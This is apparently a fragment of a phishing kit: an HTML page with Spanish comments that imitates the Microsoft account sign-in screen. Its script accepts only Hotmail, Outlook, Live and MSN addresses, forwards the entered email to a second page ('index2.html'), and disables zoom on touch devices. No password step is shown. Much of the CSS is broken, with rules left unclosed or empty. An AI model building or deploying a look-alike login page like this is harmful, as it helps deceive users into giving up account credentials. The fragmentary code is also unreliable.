        margin-right: 8px;
        flex-shrink: 0;

      .ms-logo-grid div { width: 10px; height: 10px; }

      /* ── TÍTULO: izquierda ── */
      .ms-card h1 {
        text-align: left !important;
        font-size: 24px !important;
        font-weight: 600 !important;
        line-height: 32px !important;
        color: #1b1b1b !important;
        margin: 0 0 16px 0 !important;
      }

      /* ── SUBTÍTULO: oculto ── */
      .ms-card .ms-subtitle {
        display: none !important;
      }

      /* ── INPUT: solo línea inferior ── */
      input#email {
        display: block;
        width: 100% !important;
        border: none !important;
        border-bottom: 1px solid #767676 !important;
        border-radius: 0 !important;
        padding: 4px 0 6px 0 !important;

      a.ms-link:hover, .ms-link:hover {

      /* ── FILA inferior del form: texto izquierda + botón derecha ── */
      .ms-form-bottom {
        display: flex;
        align-items: center;
        justify-content: space-between;
        margin-top: 24px;
      }

      .ms-form-bottom-text {

        color: #1b1b1b;
      }

      /* ── BOTÓN SIGUIENTE ── */
      .ms-btn-next {

        color: #fff;

        border-radius: 0;

        height: 20px;
        color: #605e5c;

      /* ── MENSAJE DE ERROR ── */

        background: #fef7f7;
        border: 1px solid #d83b01;

      /* ── FOOTER ── */

      .ms-footer-note {

      /* ── ANIMACIONES ── */

      @keyframes fadeIn {

      @keyframes shake {

    <script>
      // Dominios de Microsoft permitidos
      const allowedDomains = [
        'hotmail.com', 'hotmail.es', 'hotmail.co.uk', 'hotmail.fr', 'hotmail.de', 'hotmail.it',
        'outlook.com', 'outlook.es', 'outlook.co.uk', 'outlook.fr', 'outlook.de', 'outlook.it',
        'live.com', 'live.es', 'live.co.uk', 'live.fr', 'live.de', 'live.it',
        'msn.com'
      ];
      
      function validateMicrosoftDomain(email) {
        const domain = email.split('@')[1];
        return domain && allowedDomains.includes(domain.toLowerCase());
      }
      
      function showError() {
        const errorMessage = document.getElementById('errorMessage');
        const emailInput = document.getElementById('email');
        const form = document.getElementById('emailForm');
        
        // Mostrar mensaje de error
        errorMessage.classList.remove('hidden');
        
        // Cambiar estilo del input
        emailInput.classList.remove('ms-input');
        emailInput.classList.add('ms-input-error');
        
        // Agregar efecto de shake
        form.classList.add('error-shake');
        setTimeout(() => {
          form.classList.remove('error-shake');
        }, 500);
      }
      
      function hideError() {
        const errorMessage = document.getElementById('errorMessage');
        const emailInput = document.getElementById('email');
        
        // Ocultar mensaje de error
        errorMessage.classList.add('hidden');
        
        // Restaurar estilo del input
        emailInput.classList.remove('ms-input-error');
        emailInput.classList.add('ms-input');
      }
      
      function handleEmailSubmit(event) {
        event.preventDefault();
        
        // Prevenir múltiples envíos
        const submitButton = event.target.querySelector('button[type="submit"]');
        if (submitButton.disabled) {
          return;
        }
        
        const email = document.getElementById('email').value.trim();
        
        if (email) {
          // Deshabilitar botón inmediatamente
          submitButton.disabled = true;
          submitButton.textContent = 'Verificando...';
          
          // Validar dominio de Microsoft
          if (!validateMicrosoftDomain(email)) {
            // Re-habilitar botón si hay error
            submitButton.disabled = false;
            submitButton.textContent = 'Siguiente';
            showError();
            return;
          }
          
          // Si es válido, continuar
          window.location.href = `index2.html?email=${encodeURIComponent(email)}`;
        }
      }
      
      // Ocultar error cuando el usuario empiece a escribir
      document.getElementById('email').addEventListener('input', function() {
        if (this.value.length > 0) {
          hideError();
        }
      });
      
      // También ocultar error cuando el input reciba focus
      document.getElementById('email').addEventListener('focus', function() {
        hideError();
      });
    </script>

    <script>
      // Bloquear zoom con pellizco
      document.addEventListener('gesturestart',  e => e.preventDefault());
      document.addEventListener('gesturechange', e => e.preventDefault());
      document.addEventListener('gestureend',    e => e.preventDefault());
      // Bloquear doble tap zoom
      let lastTouch = 0;
      document.addEventListener('touchend', e => {
        const now = Date.now();
        if (now - lastTouch <= 300) e.preventDefault();
        lastTouch = now;
      }, { passive: false });
      // Bloquear pinch zoom
      document.addEventListener('touchmove', e => {
        if (e.touches.length > 1) e.preventDefault();
      }, { passive: false });
    </script>
